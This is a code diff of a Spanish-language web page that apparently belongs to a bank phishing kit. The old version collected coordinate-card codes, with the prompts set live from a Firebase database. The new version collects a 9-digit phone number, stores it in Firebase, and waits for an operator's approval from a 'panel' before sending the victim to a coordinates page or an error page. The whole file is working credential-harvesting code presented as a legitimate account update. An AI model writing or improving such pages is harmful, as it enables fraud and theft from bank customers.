@@ -2,8 +2,8 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Actualizar Teléfono</title>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
@@ -17,24 +17,17 @@
       padding: 2rem;
     }
     h2 {
-      margin-bottom: 1rem;
       text-align: center;
-    }
-    .coordenadas {
-      display: flex;
-      gap: 1rem;
       margin-bottom: 1rem;
     }
-    .coordenadas div {
-      text-align: center;
-    }
-    input {
-      width: 40px;
+    input[type="tel"] {
+      width: 200px;
+      font-size: 20px;
       padding: 10px;
-      font-size: 18px;
       text-align: center;
       border: 1px solid #ccc;
-      border-radius: 4px;
+      border-radius: 5px;
+      margin-bottom: 1rem;
     }
     button {
       padding: 10px 20px;
@@ -45,31 +38,34 @@
       border-radius: 5px;
       cursor: pointer;
     }
-    .labels {
-      display: flex;
-      justify-content: space-around;
-      width: 100%;
-      max-width: 300px;
-      margin-bottom: 0.5rem;
+    .loading {
+      font-size: 18px;
+      color: red;
+      margin-top: 2rem;
+      display: none;
     }
-    .labels span {
+    .dots span {
       font-weight: bold;
+      animation: blink 1s infinite;
+    }
+    .dots span:nth-child(2) { animation-delay: 0.2s; }
+    .dots span:nth-child(3) { animation-delay: 0.4s; }
+
+    @keyframes blink {
+      0% { opacity: 0; }
+      50% { opacity: 1; }
+      100% { opacity: 0; }
     }
   </style>
 </head>
 <body>
   <h2>Necesitamos actualizar tu teléfono</h2>
-  <div class="labels">
-    <span id="lbl1">--</span>
-    <span id="lbl2">--</span>
-    <span id="lbl3">--</span>
+  <input type="tel" id="telefono" placeholder="9 dígitos" maxlength="9" pattern="\d{9}" />
+  <button onclick="enviarTelefono()">Enviar</button>
+
+  <div class="loading" id="loading">
+    Cargando<span class="dots"><span>.</span><span>.</span><span>.</span></span>
   </div>
-  <div class="coordenadas">
-    <div><input type="text" maxlength="2" /></div>
-    <div><input type="text" maxlength="2" /></div>
-    <div><input type="text" maxlength="2" /></div>
-  </div>
-  <button onclick="verificar()">Enviar</button>
 
   <script>
     const firebaseConfig = {
@@ -81,22 +77,23 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // Escuchar cambios en vivo a las coordenadas
-    db.ref("coordenadas").on("value", (snapshot) => {
-      const labels = snapshot.val();
-      if (labels && labels.length === 3) {
-        document.getElementById("lbl1").innerText = labels[0] || "--";
-        document.getElementById("lbl2").innerText = labels[1] || "--";
-        document.getElementById("lbl3").innerText = labels[2] || "--";
+    function enviarTelefono() {
+      const telefono = document.getElementById("telefono").value;
+      if (telefono.length !== 9 || isNaN(telefono)) {
+        alert("Ingresa un teléfono válido de 9 dígitos.");
+        return;
       }
-    });
 
-    function verificar() {
-      db.ref("validacion").once("value").then(snapshot => {
+      // Guardar teléfono en Firebase
+      db.ref("telefonoTemp").set(telefono);
+      document.getElementById("loading").style.display = "block";
+
+      // Esperar aprobación desde el panel
+      db.ref("validacion").on("value", (snapshot) => {
         const estado = snapshot.val();
         if (estado === "correcto") {
-          window.location.href = "clave3.html";
-        } else {
+          window.location.href = "coordenadas.html";
+        } else if (estado === "incorrecto") {
           window.location.href = "error.html";
         }
       });
